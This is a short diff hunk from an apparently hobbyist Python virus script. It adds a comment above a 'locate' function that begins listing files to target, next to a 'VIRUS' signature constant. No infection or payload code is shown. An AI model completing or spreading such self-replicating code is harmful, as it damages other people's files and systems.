@@ -8,6 +8,7 @@ import datetime
 #assigning varible signature to virus
 SIGNATURE = "VIRUS"
 
+#defining a function called locate and the parameter is path
 def locate(path):
     files_targeted = []
     filelist = os.listdir(path)
